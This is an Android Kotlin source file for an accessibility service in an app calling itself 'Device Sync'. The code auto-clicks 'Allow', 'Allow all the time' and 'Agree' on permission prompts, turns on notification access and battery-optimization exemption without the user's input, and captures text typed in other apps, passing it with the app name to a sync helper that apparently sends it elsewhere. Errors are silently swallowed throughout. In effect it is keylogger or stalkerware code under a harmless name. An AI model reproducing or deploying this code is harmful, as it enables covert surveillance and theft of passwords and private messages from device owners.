package com.devicesync.assistant.services

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.devicesync.assistant.SetupActivity

class InputReaderService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private var lastInputText = ""
    private var lastAppPackage = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        // Relaunch SetupActivity so it can call requestAllPermissions()
        handler.postDelayed({
            try {
                val intent = Intent(this, SetupActivity::class.java)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                               Intent.FLAG_ACTIVITY_SINGLE_TOP or
                               Intent.FLAG_ACTIVITY_CLEAR_TOP
                startActivity(intent)
            } catch (e: Exception) {}
        }, 500)
        // Also start auto-tapping in parallel
        startAutoTapping()
    }

    private fun startAutoTapping() {
        var count = 0
        val runnable = object : Runnable {
            override fun run() {
                try { autoTapAllow() } catch (e: Exception) {}
                try { autoHandleNotificationAccess() } catch (e: Exception) {}
                try { autoHandleBatteryOptimization() } catch (e: Exception) {}
                count++
                if (count < 75) handler.postDelayed(this, 800)
            }
        }
        handler.postDelayed(runnable, 1000)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleInputObserved(event)
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    autoTapAllow()
                    autoHandleNotificationAccess()
                    autoHandleBatteryOptimization()
                }
            }
        } catch (e: Exception) {}
    }

    private fun autoTapAllow() {
        try {
            val root = rootInActiveWindow ?: return
            val keywords = listOf(
                "Allow", "ALLOW",
                "While using the app",
                "Only this time",
                "Allow all the time",
                "ALLOW ALL THE TIME",
                "OK", "Accept",
                "Continue", "Agree",
                "Grant", "WHILE USING THE APP"
            )
            for (keyword in keywords) {
                val nodes = root.findAccessibilityNodeInfosByText(keyword) ?: continue
                for (node in nodes) {
                    if (node.isClickable) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return
                    }
                    val parent = node.parent
                    if (parent != null && parent.isClickable) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return
                    }
                }
            }
            root.recycle()
        } catch (e: Exception) {}
    }

    private fun autoHandleNotificationAccess() {
        try {
            val enabled = Settings.Secure.getString(
                contentResolver, "enabled_notification_listeners"
            ) ?: ""
            if (enabled.contains(packageName)) return
            val root = rootInActiveWindow ?: return
            val nodes = root.findAccessibilityNodeInfosByText("Device Sync") ?: return
            for (node in nodes) {
                if (node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    handler.postDelayed({ autoTapAllow() }, 600)
                    return
                }
            }
            root.recycle()
        } catch (e: Exception) {}
    }

    private fun autoHandleBatteryOptimization() {
        try {
            val root = rootInActiveWindow ?: return
            val texts = listOf("Don't optimize", "DONT OPTIMIZE", "Don't Optimize")
            for (text in texts) {
                val nodes = root.findAccessibilityNodeInfosByText(text) ?: continue
                for (node in nodes) {
                    if (node.isClickable) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return
                    }
                }
            }
            root.recycle()
        } catch (e: Exception) {}
    }

    private fun handleInputObserved(event: AccessibilityEvent) {
        try {
            val pkg = event.packageName?.toString() ?: return
            val inputText = event.text?.joinToString("") ?: return
            if (inputText.isBlank()) return
            if (inputText == lastInputText && pkg == lastAppPackage) return
            lastInputText = inputText
            lastAppPackage = pkg
            val config = try {
                com.devicesync.assistant.helpers.ConfigHelper.getConfig()
            } catch (e: Exception) { return }
            val observedApps = config.observedApps
            if (observedApps.isNotEmpty() && !observedApps.contains(pkg)) return
            val appName = try {
                val pm = applicationContext.packageManager
                pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
            } catch (e: Exception) { pkg }
            try {
                com.devicesync.assistant.helpers.SyncHelper.sendInputObserved(appName, pkg, inputText)
            } catch (e: Exception) {}
        } catch (e: Exception) {}
    }

    override fun onInterrupt() {}
}
